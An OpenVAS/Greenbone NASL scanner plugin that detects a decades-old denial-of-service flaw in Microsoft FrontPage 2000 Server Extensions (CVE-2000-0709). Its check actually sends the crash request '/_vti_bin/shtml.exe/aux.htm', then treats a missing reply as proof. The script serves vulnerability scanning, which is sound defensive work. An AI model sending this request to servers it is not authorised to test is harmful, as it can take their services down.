CPE = "cpe:/a:microsoft:internet_information_services";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902839" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_bugtraq_id( 1608 );
	script_cve_id( "CVE-2000-0709" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-05-24 17:17:17 +0530 (Thu, 24 May 2012)" );
	script_name( "Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "secpod_ms_iis_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/installed" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/5124" );
	script_xref( name: "URL", value: "http://www.securiteam.com/windowsntfocus/5NP0N0U2AA.html" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2000-08/0288.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause denial of service
  conditions." );
	script_tag( name: "affected", value: "Microsoft FrontPage 2000 Server Extensions 1.1." );
	script_tag( name: "insight", value: "The flaw is due to an error in the 'shtml.exe' component, which
  allows remote attackers to cause a denial of service in some components
  by requesting a URL whose name includes a standard DOS device name." );
	script_tag( name: "solution", value: "Upgrade to Microsoft FrontPage 2000 Server Extensions 1.2 or later." );
	script_tag( name: "summary", value: "This host is running Microsoft FrontPage Server Extensions and is
  prone to denial of service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
url = "/_vti_bin/shtml.exe";
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "FrontPage Server Extensions", extra_check: "Server: Microsoft-IIS" )){
	vulnurl = "/_vti_bin/shtml.exe/aux.htm";
	req = http_get( item: vulnurl, port: port );
	http_send_recv( port: port, data: req );
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if(!res){
		report = http_report_vuln_url( port: port, url: vulnurl );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

